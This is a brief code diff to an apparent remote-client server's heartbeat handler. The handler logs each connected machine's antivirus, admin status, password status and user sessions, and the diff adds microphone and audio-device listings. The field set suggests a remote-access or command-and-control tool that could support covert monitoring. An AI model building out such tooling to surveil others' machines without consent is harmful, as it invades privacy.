@@ -46,7 +46,9 @@ def heartbeat():
             "device_name": system_info.get('device_name', 'N/A'),
             "user_sessions": system_info.get('user_sessions', []),
             "has_password": system_info.get('has_password', False),
-            "current_background_image": system_info.get('current_background_image', None)
+            "current_background_image": system_info.get('current_background_image', None),
+            "microphones": system_info.get('microphones', []), # New: Get microphone information
+            "audio_devices": system_info.get('audio_devices', []) # New: Get audio device information
         }
         print(f"Heartbeat from {client_id} (IP: {ip}). CPU: {system_info.get('cpu')}%. Memory: {system_info.get('memory_percent')}%. Uptime: {system_info.get('uptime')}. Antivirus: {system_info.get('antivirus')}. Admin: {system_info.get('is_admin')}. Clients online: {len(connected_clients)}")
         if system_info.get('current_background_image'):
